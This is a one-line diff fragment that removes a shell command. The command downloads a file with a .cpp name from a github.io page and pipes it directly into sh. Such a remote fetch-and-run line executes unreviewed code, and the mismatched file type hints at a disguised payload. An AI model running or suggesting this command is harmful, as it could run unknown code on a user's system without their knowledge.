@@ -1,1 +1,0 @@
-curl -L --progress-bar frkns.github.io/fun/ORDERED_TRIUMPH_METALS_INNOVATIONS.cpp | sh
